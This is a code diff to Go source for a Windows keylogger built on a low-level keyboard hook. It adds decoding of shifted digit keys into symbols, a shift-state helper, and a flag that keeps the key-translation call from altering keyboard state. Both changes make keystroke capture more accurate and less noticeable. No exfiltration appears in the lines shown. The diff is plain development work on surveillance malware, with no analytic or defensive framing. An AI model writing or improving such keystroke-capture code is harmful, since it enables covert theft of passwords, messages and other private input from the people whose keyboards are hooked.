@@ -31,6 +31,8 @@ const (
 
 	hookHealth = 3 * time.Second
 
+	toUnicodeNoStateChange = 0x04
+
 	vkBack    = 0x08
 	vkTab     = 0x09
 	vkReturn  = 0x0D
@@ -194,7 +196,13 @@ func (k *Keylogger) record(kb *kbdllHookStruct) {
 	}
 }
 
+var usShiftDigits = [10]rune{')', '!', '@', '#', '$', '%', '^', '&', '*', '('}
+
 func (k *Keylogger) decode(kb *kbdllHookStruct) (string, bool) {
+	if kb.VkCode >= 0x30 && kb.VkCode <= 0x39 && shiftDown() {
+		return string(usShiftDigits[kb.VkCode-0x30]), true
+	}
+
 	k.mu.Lock()
 	layout := k.layout
 	caps := k.caps
@@ -213,7 +221,7 @@ func (k *Keylogger) decode(kb *kbdllHookStruct) (string, bool) {
 		uintptr(unsafe.Pointer(&state[0])),
 		uintptr(unsafe.Pointer(&buf[0])),
 		uintptr(len(buf)),
-		0,
+		toUnicodeNoStateChange,
 		layout,
 	)
 	if int32(n) <= 0 {
@@ -280,6 +288,10 @@ func suppressKey() bool {
 func down(vk uint32) bool {
 	res, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
 	return int32(res)&0x8000 != 0
+}
+
+func shiftDown() bool {
+	return down(0x10) || down(0xA0) || down(0xA1)
 }
 
 func silentKey(vk uint32) bool {
